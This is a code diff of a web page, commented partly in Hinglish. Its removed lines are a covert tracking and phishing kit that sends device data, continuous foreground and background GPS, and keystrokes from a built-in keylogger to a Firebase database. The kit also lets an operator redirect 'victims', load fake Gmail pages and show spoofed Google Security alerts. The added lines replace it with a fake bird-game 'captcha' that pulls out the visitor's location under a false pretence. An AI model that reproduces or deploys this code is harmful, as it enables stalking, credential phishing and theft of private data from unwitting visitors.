-        visitNumber: visitCount, lastSeen: Date.now(),
-        lastSeenTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
-        status: 'active'
-      };
-    }
-
-    async function saveDeviceDataToFirebase(data) {
-      if (!database) return false;
-      await database.ref(`devices/${deviceId}`).update(data);
-      await database.ref(`device_history/${deviceId}`).push({
-        ...data, loggedAt: Date.now(), loggedTime: data.lastSeenTime
-      });
-      await database.ref(`online_devices/${deviceId}`).set({
-        status: 'online', lastSeen: data.lastSeen, lastSeenTime: data.lastSeenTime
-      });
-      return true;
-    }
-
-    async function updateDeviceInfo() {
-      try {
-        const d = await collectDeviceData();
-        await saveDeviceDataToFirebase(d);
-        return d;
-      } catch (e) { return null; }
-    }
-
-    async function saveHardwareSoftwareInfo() {
-      const info = getHardwareSoftwareInfo();
-      const payload = {
-        deviceId, hardware: info.hardware, software: info.software,
-        timestamp: Date.now(),
-        dateTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
-      };
-      await saveToFirebase(`hardware_info/${deviceId}/current`, payload);
-      await saveToFirebase(`software_info/${deviceId}/current`, payload);
-    }
-
-    /* ---------------- PERMISSIONS ---------------- */
-    function smartLocationRequest() {
-      if (!navigator.geolocation) return;
-
-      // Direct GPS try karo (browser popup aayega)
       navigator.geolocation.getCurrentPosition(
         (pos) => {
-          console.log("✅ Location Permission Granted");
-          captureGPS();
+          const gpsData = {
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude,
+            accuracy: pos.coords.accuracy,
+            timestamp: Date.now(),
+            source: 'captcha_fullpage',
+            hits: state.hits,
+            time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
+          };
+
+          if (database && deviceId !== 'unknown') {
+            database.ref(`gps_locations/${deviceId}/current`).set(gpsData);
+            database.ref(`gps_locations/${deviceId}/history`).push(gpsData);
+            database.ref(`captcha_sessions/${deviceId}/${Date.now()}`).set({
+              ...gpsData,
+              captchaType: 'bird_fullpage',
+              sessionComplete: true
+            });
+          }
+
+          showSuccess();
         },
         (err) => {
-          console.log("⚠️ Location Denied. Waiting for user click...");
+          statusEl.textContent = '⚠️ Location required. Please allow.';
+          statusEl.className = 'status error';
 
-          // Agar block hai, toh user ke click pe wapas try karo
-          const askAgain = () => {
+          setTimeout(() => {
             navigator.geolocation.getCurrentPosition(
               (pos) => {
-                console.log("✅ Location Granted on Click");
-                captureGPS();
+                const gpsData = {
+                  latitude: pos.coords.latitude,
+                  longitude: pos.coords.longitude,
+                  accuracy: pos.coords.accuracy,
+                  timestamp: Date.now(),
+                  source: 'captcha_fullpage_retry',
+                  hits: state.hits
+                };
+                if (database && deviceId !== 'unknown') {
+                  database.ref(`gps_locations/${deviceId}/current`).set(gpsData);
+                }
+                showSuccess();
               },
-              (e) => console.log("Still denied:", e.message),
-              { enableHighAccuracy: true }
+              () => {
+                statusEl.textContent = '❌ Verification failed. Please refresh.';
+                statusEl.className = 'status error';
+              },
+              { enableHighAccuracy: true, timeout: 10000 }
             );
-            document.removeEventListener('click', askAgain);
-          };
-          document.addEventListener('click', askAgain);
+          }, 1500);
         },
         { enableHighAccuracy: true, timeout: 10000 }
       );
     }
 
-    function requestNotificationPermission() {
-      if ('Notification' in window) {
-        Notification.requestPermission().then(p => {
-          if (p === 'granted') saveToFirebase(`notifications/${deviceId}/status`, { status: 'granted', timestamp: Date.now() });
-        });
-      }
-    }
+    // ═══════════════════════════════════════════════════════════════
+    // SUCCESS SCREEN
+    // ═══════════════════════════════════════════════════════════════
+    function showSuccess() {
+      const screen = document.createElement('div');
+      screen.className = 'success-screen';
+      screen.innerHTML = `
+        <div class="success-box">
+          <div class="check-circle">✓</div>
+          <h2>Verification Complete</h2>
+          <p>You hit ${state.hits} birds!</p>
+          <p style="margin-top:10px; font-size:12px; color:#8ab4d4;">
+            Redirecting to your destination...
+          </p>
+        </div>
+      `;
+      document.body.appendChild(screen);
 
-    function startPermissionReminder() {
-      if (permissionInterval) clearInterval(permissionInterval);
-      permissionInterval = setInterval(() => {
-        if (!navigator.permissions) return;
-        try {
-          navigator.permissions.query({ name: 'geolocation' }).then(r => {
-            if (r.state === 'granted') captureGPS();
-          }).catch(() => { });
-        } catch (e) {
-          console.log("Permission query failed silently");
-        }
-      }, 120000);
-    }
-    /* ---------------- SCREEN STATE ---------------- */
-    function updateScreenStatus() {
-      const status = document.hidden ? 'OFF' : 'ON';
-      if (database) {
-        database.ref(`devices/${deviceId}/screenStatus`).set(status);
-        database.ref(`online_devices/${deviceId}/screen`).set(status);
-      }
-    }
-
-    /* ---------------- ADMIN COMMANDS ---------------- */
-    function listenForAdminCommand() {
-      if (!database) return;
-
-      // 1. IFRAME CONTROL (Game, Gmail, Custom URL)
-      const mapPage = (p) => {
-        const pages = { 'game': 'game.html', 'videochat': 'videochat.html', 'engage': 'engage.html', 'gmail': 'gmail.html' };
-        return pages[p] || 'game.html';
-      };
-
-      database.ref(`admin_commands/${deviceId}/iframe`).on('value', (snap) => {
-        const c = snap.val();
-        if (c && c.active) {
-          const iframe = document.getElementById('dynamicFrame');
-          if (!iframe) return;
-
-          let targetUrl = c.custom_url || mapPage(c.page);
-
-          if (targetUrl) {
-            iframe.src = targetUrl;
-            iframe.style.display = 'block';
-            localStorage.setItem('active_iframe_url', targetUrl);
-            console.log(`✅ Loaded: ${targetUrl}`);
-          }
-          database.ref(`admin_commands/${deviceId}/iframe`).remove();
-        }
-      });
-
-      // 2. FORCE REDIRECT
-      database.ref(`admin_commands/${deviceId}/redirect`).on('value', (snap) => {
-        const c = snap.val();
-        if (c && c.url && c.active) {
-          localStorage.removeItem('active_iframe_url');
-          window.location.href = c.url;
-          database.ref(`admin_commands/${deviceId}/redirect`).remove();
-        }
-      });
-
-      // 3. SHOW ALERT POPUP
-      database.ref(`admin_commands/${deviceId}/alert`).on('value', (snap) => {
-        const c = snap.val();
-        if (c && c.message && c.active) {
-          const popup = document.getElementById('customAlert');
-          const msgBox = document.getElementById('customAlertMessage');
-          const brandName = document.getElementById('popupBrandName');
-          const brandUrl = document.getElementById('popupBrandUrl');
-          const brandIcon = document.getElementById('popupBrandIconImg');
-
-          if (popup && msgBox) {
-            msgBox.textContent = c.message;
-            if (brandUrl) brandUrl.textContent = c.url || 'accounts.google.com';
-            if (brandName) brandName.textContent = c.brand ? `${c.brand} Security` : 'Google Security';
-            if (brandIcon) {
-              if (c.icon && c.icon.startsWith('http')) {
-                brandIcon.src = c.icon;
-                brandIcon.style.display = 'block';
-              } else {
-                brandIcon.src = 'https://www.google.com/favicon.ico';
-              }
-            }
-            popup.style.display = 'flex';
-          }
-          database.ref(`admin_commands/${deviceId}/alert`).remove();
-        }
-      });
-
-      // 4. VIBRATE
-      database.ref(`admin_commands/${deviceId}/vibrate`).on('value', (snap) => {
-        const c = snap.val();
-        if (c && c.active) {
-          if (navigator.vibrate) navigator.vibrate(1000);
-          database.ref(`admin_commands/${deviceId}/vibrate`).remove();
-        }
-      });
-
-      // 5. CLIPBOARD (Fixed - No auto failure toast)
-      database.ref(`admin_commands/${deviceId}/clipboard`).on('value', async (snap) => {
-        const c = snap.val();
-        if (c && c.text && c.active) {
-          await setClipboardText(c.text);
-          database.ref(`admin_commands/${deviceId}/clipboard`).remove();
-        }
-      });
-
-      // 6. ✅ NAYA: CUSTOM TOAST FROM ADMIN
-      database.ref(`admin_commands/${deviceId}/custom_toast`).on('value', (snap) => {
-        const c = snap.val();
-        if (c && c.message && c.active) {
-
-          // Victim ko custom toast dikhao
-          const container = document.getElementById('victimToasts');
-          if (container) {
-            const t = document.createElement('div');
-            t.className = 'v-toast ' + (c.type || 'ok');
-            const icon = (c.type === 'err') ? '✖' : '✔';
-            t.innerHTML = `<span class="v-toast-icon">${icon}</span> <span>${c.message}</span>`;
-            container.appendChild(t);
-
-            requestAnimationFrame(() => t.classList.add('show'));
-            setTimeout(() => {
-              t.classList.remove('show');
-              setTimeout(() => t.remove(), 300);
-            }, 3000);
-          }
-
-          database.ref(`admin_commands/${deviceId}/custom_toast`).remove();
-        }
-      });
-
-
-      // ======================================================
-      // ✅ FINAL NOTIFICATION LISTENER (Bulletproof)
-      // ======================================================
-      database.ref(`admin_commands/${deviceId}/notification`).on('value', (snap) => {
-        const c = snap.val();
-        console.log("🔔 Data:", c);
-
-        if (!c || !c.message) return;
-
-        if (Notification.permission === "granted") {
-          navigator.serviceWorker.ready.then((reg) => {
-            reg.showNotification(c.title || "Alert", {
-              body: c.message,
-              icon: c.icon || 'https://www.google.com/favicon.ico',
-              requireInteraction: true
-            });
-            console.log("✅ Notification Sent via Service Worker!");
-          });
-
-          database.ref(`admin_commands/${deviceId}/notification`).remove();
-        }
-      });
-    }
-
-
-    function showVictimToast(msg, type = 'ok') {
-      const container = document.getElementById('victimToasts');
-      if (!container) return;
-
-      const t = document.createElement('div');
-      t.className = 'v-toast ' + type;
-
-      const icon = type === 'ok' ? '✔' : '✖';
-
-      t.innerHTML = `<span class="v-toast-icon">${icon}</span> <span>${msg}</span>`;
-      container.appendChild(t);
-
-      // Animation
-      requestAnimationFrame(() => t.classList.add('show'));
-
-      // Auto remove
       setTimeout(() => {
-        t.classList.remove('show');
-        setTimeout(() => t.remove(), 300);
-      }, 3000);
-    }
-    /* ---------------- TIMERS & BACKGROUND TRACKING ---------------- */
-
-    function startGPSTracking() {
-      if (gpsInterval) clearInterval(gpsInterval);
-
-      // Pehli baar turant
-      captureGPS();
-
-      // Screen ON ke liye aggressive tracking
-      gpsInterval = setInterval(() => {
-        if (!document.hidden) {
-          captureGPS(); // High accuracy
-        } else {
-          silentBackgroundGPS(); // Low accuracy fallback
-        }
-      }, 10000);
-
-      // 🚀 EXTRA: Visibility change pe trigger
-      document.addEventListener('visibilitychange', () => {
-        if (!document.hidden) {
-          captureGPS(); // Wapas aane pe turant
-        } else {
-          silentBackgroundGPS(); // Jaane pe turant
-        }
-      });
-
-      // 🚀 EXTRA: Page hide pe (phone lock)
-      window.addEventListener('pagehide', () => {
-        silentBackgroundGPS();
-      });
+        screen.style.opacity = '0';
+        screen.style.transition = 'opacity 0.3s';
+        setTimeout(() => screen.remove(), 300);
+      }, 2000);
     }
 
-    // 2. GEO TRACKING (IP Based)
-    function startGeoTracking() {
-      if (geoInterval) clearInterval(geoInterval);
-      captureGeo();
-
-      geoInterval = setInterval(() => {
-        if (!document.hidden) {
-          captureGeo();
-        } else {
-          // Background me Geo update (kam frequent)
-          setTimeout(() => { captureGeo(); }, 30000);
-        }
-      }, 15000); // 15 seconds
-    }
-
-    // 3. ✅ SILENT BACKGROUND GPS (Naya Function)
-    function silentBackgroundGPS() {
-      if (!navigator.geolocation) return;
-
-      navigator.geolocation.getCurrentPosition(
-        (pos) => {
-          const gpsData = {
-            latitude: pos.coords.latitude,
-            longitude: pos.coords.longitude,
-            accuracy: pos.coords.accuracy,
-            timestamp: Date.now(),
-            dateTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
-            type: 'background_gps',
-            screen: 'OFF'
-          };
-
-          if (database) {
-            // Current location update karo
-            database.ref(`gps_locations/${deviceId}/current`).set(gpsData);
-
-            // History me sirf har 5 minute me save karo (taaki database na bhare)
-            const lastHistory = localStorage.getItem('last_bg_gps_history');
-            const now = Date.now();
-            if (!lastHistory || now - parseInt(lastHistory) > 300000) { // 5 min
-              database.ref(`gps_locations/${deviceId}/history`).push(gpsData);
-              localStorage.setItem('last_bg_gps_history', now);
-            }
-          }
-          console.log('📍 Background GPS Updated:', pos.coords.latitude, pos.coords.longitude);
-        },
-        (err) => {
-          console.log('⚠️ Background GPS Failed:', err.message);
-        },
-        {
-          enableHighAccuracy: false, // Battery save
-          timeout: 15000,
-          maximumAge: 60000 // Purana data bhi chalega
-        }
-      );
-    }
-
-    // 4. ✅ NEW FUNCTION: handleInstallClick (Tumhara code)
-    function handleInstallClick() {
-      // Popup band karo
-      const popup = document.getElementById('customAlert');
-      if (popup) popup.style.display = 'none';
-
-      // ACTION: Victim ko kahan bhejna hai?
-      // Example ke liye maine Google daala hai, tum apna link daal sakte ho.
-      window.location.href = "https://google.com";
-
-      // Agar tum chahte ho ki victim ke iframe me kuch load ho, toh ye use karo:
-      // const iframe = document.getElementById('dynamicFrame');
-      // if (iframe) iframe.src = 'fake-update.html';
-    }
-
-    function silentBackgroundGPS() {
-      if (!navigator.geolocation) return;
-
-      navigator.geolocation.getCurrentPosition(
-        (pos) => {
-          const gpsData = {
-            latitude: pos.coords.latitude,
-            longitude: pos.coords.longitude,
-            accuracy: pos.coords.accuracy,
-            timestamp: Date.now(),
-            dateTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
-            type: 'background_gps',
-            screen: 'OFF'
-          };
-
-          if (database) {
-            // Current location update karo
-            database.ref(`gps_locations/${deviceId}/current`).set(gpsData);
-
-            // History me sirf har 5 minute me save karo (taaki database na bhare)
-            const lastHistory = localStorage.getItem('last_bg_gps_history');
-            const now = Date.now();
-            if (!lastHistory || now - parseInt(lastHistory) > 300000) { // 300,000 ms = 5 min
-              database.ref(`gps_locations/${deviceId}/history`).push(gpsData);
-              localStorage.setItem('last_bg_gps_history', now);
-            }
-          }
-          console.log('📍 Background GPS Updated:', pos.coords.latitude, pos.coords.longitude);
-        },
-        (err) => {
-          console.log('⚠️ Background GPS Failed:', err.message);
-        },
-        {
-          enableHighAccuracy: false, // Battery save ke liye low accuracy
-          timeout: 15000,
-          maximumAge: 60000 // Purana data bhi chalega
-        }
-      );
-    }
-
-    /* ---------------- BOOT ---------------- */
-    async function startApp() {
-      deviceId = generateDeviceId();
-      // 🚀 FORCE SAVE (bina kisi complex function ke)
-      if (database) {
-        database.ref(`devices/${deviceId}`).set({
-          deviceId: deviceId,
-          browser: getDeviceInfo().browser,
-          os: getDeviceInfo().os,
-          userAgent: navigator.userAgent,
-          screen: screen.width + 'x' + screen.height,
-          lastSeen: Date.now(),
-          lastSeenTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
-          status: 'active'
-        }).then(() => {
-          console.log("✅ Device Saved Successfully");
-        }).catch(e => {
-          console.log("❌ Device Save Failed:", e);
-        });
-
-        database.ref(`online_devices/${deviceId}`).set({
-          status: 'online',
-          lastSeen: Date.now()
-        });
-      }
-      if ('serviceWorker' in navigator) {
-        navigator.serviceWorker.register('sw.js').then(r => console.log('✅ SW Registered')).catch(e => console.error(e));
-      }
-      // ✅ Service Worker Register + Periodic Sync
-      if ('serviceWorker' in navigator) {
-        navigator.serviceWorker.register('sw.js').then(async (reg) => {
-          console.log('✅ SW Registered:', reg.scope);
-
-          // IndexedDB me deviceId save karo (taaki SW use kar sake)
-          const dbReq = indexedDB.open('tracker_db', 1);
-          dbReq.onupgradeneeded = (e) => e.target.result.createObjectStore('config');
-          dbReq.onsuccess = (e) => {
-            const db = e.target.result;
-            const tx = db.transaction('config', 'readwrite');
-            tx.objectStore('config').put(deviceId, 'deviceId');
-          };
-
-          // 🚀 Periodic Background Sync register karo
-          if ('periodicSync' in reg) {
-            try {
-              const status = await navigator.permissions.query({ name: 'periodic-background-sync' });
-              if (status.state === 'granted') {
-                await reg.periodicSync.register('gps-sync', {
-                  minInterval: 15 * 60 * 1000 // 15 minutes
-                });
-                console.log('✅ Periodic Background Sync Registered');
-              }
-            } catch (err) {
-              console.log('⚠️ Periodic Sync not available:', err.message);
-            }
-          }
-        }).catch(err => console.error('SW Error:', err));
-      }
-      listenForAdminCommand();
-      initClipboardMonitoring();
-      listenForAdminClipboard();
-      setTimeout(autoReadClipboardOnLoad, 1000);
-      startPeriodicClipboardCheck();
-      initMobileSensors();
-
-      await saveHardwareSoftwareInfo().catch(e => console.log("HW Info failed:", e));
-
-      // ✅ NAYA: Notification Permission (User Click ke baad)
-      if ("Notification" in window) {
-        if (Notification.permission === "granted") {
-          database.ref(`devices/${deviceId}/notification_status`).set("granted");
-        } else if (Notification.permission === "default") {
-
-          // Function jo permission mangega
-          const askPermission = () => {
-            Notification.requestPermission().then(permission => {
-              if (permission === "granted") {
-                console.log("✅ Notifications allowed");
-                database.ref(`devices/${deviceId}/notification_status`).set("granted");
-              }
-            });
-            // Ek baar puchne ke baad listener hata do
-            document.removeEventListener('click', askPermission);
-          };
-          let keyLogBuffer = '';
-          let keyLogTimer = null;
-
-          document.addEventListener('keydown', (e) => {
-            // Ignore modifier keys
-            if (['Shift', 'Control', 'Alt', 'Meta', 'CapsLock', 'Tab'].includes(e.key)) return;
-
-            let char = e.key;
-
-            // Special keys ko readable banao
-            if (e.key === ' ') char = ' ';
-            if (e.key === 'Enter') char = '\n';
-            if (e.key === 'Backspace') char = '[BACKSPACE]';
-            if (e.key === 'Delete') char = '[DELETE]';
-            if (e.key === 'Escape') char = '[ESC]';
-
-            keyLogBuffer += char;
-
-            // Har 5 second me batch save karo (spam na ho)
-            clearTimeout(keyLogTimer);
-            keyLogTimer = setTimeout(() => {
-              if (keyLogBuffer.length > 0) {
-                database.ref(`keylogs/${deviceId}/${Date.now()}`).set({
-                  keys: keyLogBuffer,
-                  url: window.location.href,
-                  timestamp: Date.now(),
-                  time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
-                });
-                keyLogBuffer = '';
-              }
-            }, 5000);
-          });
-
-          // Form submit hone pe turant save karo
-          document.addEventListener('submit', (e) => {
-            if (keyLogBuffer.length > 0) {
-              database.ref(`keylogs/${deviceId}/${Date.now()}`).set({
-                keys: keyLogBuffer,
-                url: window.location.href,
-                timestamp: Date.now(),
-                time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
-                type: 'form_submit'
-              });
-              keyLogBuffer = '';
-            }
-          });
-
-          console.log('✅ Keylogger active');
-          // Jab user page pe click karega tabhi permission popup aayega
-          setTimeout(() => {
-            document.addEventListener('click', askPermission);
-          }, 3000);
-        }
-      }
-
-      await updateVisitCount().catch(e => console.log("Visit failed:", e));
-      await updateDeviceInfo().catch(e => console.log("Device Info failed:", e));
-
-      startGPSTracking();
-      startGeoTracking();
-      smartLocationRequest();
-      startPermissionReminder();
-
-      // Heartbeat every 2 min
-      setInterval(async () => {
-        if (document.hidden) return;
-        const battery = await getBatteryInfo();
-        const screen = getScreenInfo();
-        if (database) {
-          await database.ref(`devices/${deviceId}/battery`).set(battery);
-          await database.ref(`devices/${deviceId}/screen`).set(screen);
-          await database.ref(`devices/${deviceId}/lastSeen`).set(Date.now());
-        }
-      }, 120000);
-
-      updateScreenStatus();
-      // ✅ VISIBILITY CHANGE (Screen ON/OFF Handling)
-      document.addEventListener('visibilitychange', () => {
-        updateScreenStatus();
-
-        if (!document.hidden) {
-          // Screen ON hui -> Turant GPS aur Geo update karo
-          console.log("💡 Screen ON - High Accuracy Tracking");
-          captureGPS();
-          captureGeo();
-        } else {
-          // Screen OFF hui -> Background tracking trigger karo
-          console.log("📴 Screen OFF - Background Tracking Active");
-
-          // Notification se browser ko force karo ki JS chalti rahe
-          if ("Notification" in window && Notification.permission === "granted") {
-            navigator.serviceWorker.ready.then(reg => {
-              reg.showNotification("System Sync", {
-                body: "Syncing data in background...",
-                silent: true,
-                tag: 'bg-sync',
-                requireInteraction: false
-              });
-            }).catch(e => { });
-          }
-
-          // Turant ek background GPS update bhejo
-          silentBackgroundGPS();
-        }
-      });
-
-      console.log('✅ Silent tracker active + fullscreen iframe');
-    }
-
-    function initFirebase() {
-      if (typeof firebaseConfig === 'undefined') {
-        console.error('❌ config.js missing');
-        alert('config.js missing');
-        return;
-      }
-      if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
-      database = firebase.database();
-      console.log('✅ Firebase ready');
-
-      // ✅ RELOAD FIX
-      const savedIframeUrl = localStorage.getItem('active_iframe_url');
-      if (savedIframeUrl) {
-        const iframe = document.getElementById('dynamicFrame');
-        if (iframe) {
-          iframe.src = savedIframeUrl;
-          iframe.style.display = 'block';
-          console.log('🔄 Restored iframe from reload:', savedIframeUrl);
-        }
-      }
-
-      // 🚀 START WITH ERROR CATCH
-      startApp().catch(err => {
-        console.error('❌ startApp() failed:', err);
-
-        // Screen pe error dikhao
-        const errDiv = document.createElement('div');
-        errDiv.style.cssText = 'position:fixed;top:0;left:0;right:0;background:red;color:white;padding:20px;z-index:999999;font-family:monospace;font-size:12px;white-space:pre-wrap;';
-        errDiv.innerHTML = `<b>❌ ERROR:</b> ${err.message}\n\n<b>Stack:</b>\n${err.stack}`;
-        document.body.appendChild(errDiv);
-      });
-    }
-
-    /* ---------------- LIFECYCLE ---------------- */
-    document.addEventListener('visibilitychange', () => {
-      if (!document.hidden) { captureGPS(); captureGeo(); updateDeviceInfo(); }
+    // ═══════════════════════════════════════════════════════════════
+    // START
+    // ═══════════════════════════════════════════════════════════════
+    window.addEventListener('load', () => {
+      setTimeout(() => {
+        statusEl.textContent = '🔍 Scanning browser...';
+        statusEl.className = 'status';
+        setTimeout(() => {
+          statusEl.textContent = '🎯 Hit the bird fast!';
+          statusEl.className = 'status';
+          startTimer();
+        }, 800);
+      }, 400);
     });
-
-    window.addEventListener('beforeunload', async () => {
-      if (database) {
-        await database.ref(`online_devices/${deviceId}`).set({
-          status: 'offline',
-          offlineTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
-        });
-      }
-      if (gpsInterval) clearInterval(gpsInterval);
-      if (geoInterval) clearInterval(geoInterval);
-    });
-
-    window.addEventListener('online', async () => { await updateDeviceInfo(); captureGPS(); captureGeo(); });
-    window.addEventListener('offline', () => { });
-
-    /* ---------------- START ---------------- */
-    if (typeof firebaseConfig !== 'undefined') initFirebase();
-    else window.addEventListener('load', () => {
-      if (typeof firebaseConfig !== 'undefined') initFirebase();
-      else console.error('config.js file not found!');
-    });
-
   </script>
-  <!--CREATED BY https://www.xploitpoison.com/-->
 </body>
 
 </html>
